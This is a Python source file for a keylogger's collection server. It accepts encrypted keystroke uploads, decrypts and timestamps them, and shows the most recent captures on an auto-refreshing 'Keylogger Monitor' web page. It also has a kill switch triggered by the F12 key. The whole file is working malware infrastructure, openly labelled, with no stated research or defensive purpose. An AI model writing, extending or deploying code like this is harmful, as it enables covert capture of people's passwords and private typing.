from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import traceback
from crypto_utils import Encryptor
from datetime import datetime

class KeyloggerServer(BaseHTTPRequestHandler):
    stored_logs = []  # Store decrypted logs
    encryptor = Encryptor()
    is_running = True

    def do_GET(self):
        try:
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            
            status = "Active" if self.is_running else "Stopped"
            status_color = "#28a745" if self.is_running else "#dc3545"
            
            # Reverse the logs to show newest first
            recent_logs = list(reversed(self.stored_logs[-50:]))
            logs_html = "\n".join([
                f'<div class="log-entry">{log}</div>' 
                for log in recent_logs
            ])
            
            response = f"""
            <html>
                <head>
                    <title>Keylogger Monitor</title>
                    <meta http-equiv="refresh" content="2">
                    <style>
                        body {{
                            font-family: Arial, sans-serif;
                            margin: 20px;
                            background: #f0f0f0;
                        }}
                        .container {{
                            max-width: 800px;
                            margin: 0 auto;
                            background: white;
                            padding: 20px;
                            border-radius: 8px;
                            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
                        }}
                        .log-entry {{
                            padding: 8px;
                            margin: 5px 0;
                            background: #f8f9fa;
                            border-left: 4px solid #007bff;
                            font-family: monospace;
                            white-space: pre-wrap;
                            word-wrap: break-word;
                        }}
                        .status {{
                            color: {status_color};
                            font-weight: bold;
                            font-size: 1.1em;
                            padding: 10px;
                            background: #f8f9fa;
                            border-radius: 4px;
                            margin: 10px 0;
                        }}
                        .log-container {{
                            max-height: 500px;
                            overflow-y: auto;
                            margin-top: 20px;
                        }}
                    </style>
                </head>
                <body>
                    <div class="container">
                        <h1>Keylogger Monitor</h1>
                        <div class="status">Status: {status} - Auto-refresh every 2s</div>
                        <div class="log-container">
                            {logs_html if logs_html else "<p>No keystrokes recorded yet...</p>"}
                        </div>
                    </div>
                </body>
            </html>
            """
            self.wfile.write(response.encode())
        except Exception as e:
            print(f"Error in GET handler: {str(e)}")

    def do_POST(self):
        try:
            content_length = int(self.headers['Content-Length'])
            encrypted_data = self.rfile.read(content_length)
            
            try:
                # Decrypt and store the data
                decrypted_data = self.encryptor.decrypt_data(encrypted_data)
                
                # Check for kill switch
                if "Key.f12" in decrypted_data:
                    self.is_running = False
                    print("Kill switch activated!")
                
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                log_entry = f"[{timestamp}] {decrypted_data}"
                
                self.stored_logs.append(log_entry)
                if len(self.stored_logs) > 100:
                    self.stored_logs.pop(0)
                
                print(f"Received: {log_entry}")
            except Exception as e:
                print(f"Decryption error: {str(e)}")
            
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(b"Data received")
            
        except Exception as e:
            print(f"Error in POST handler: {str(e)}")
            traceback.print_exc()

def start_server(port=8080):
    try:
        server = HTTPServer(('localhost', port), KeyloggerServer)
        print(f"Server started on port {port}")
        print(f"View keylogger data at: http://localhost:{port}")
        server.serve_forever()
    except KeyboardInterrupt:
        print("\nShutting down server...")
        server.socket.close()

if __name__ == "__main__":
    start_server()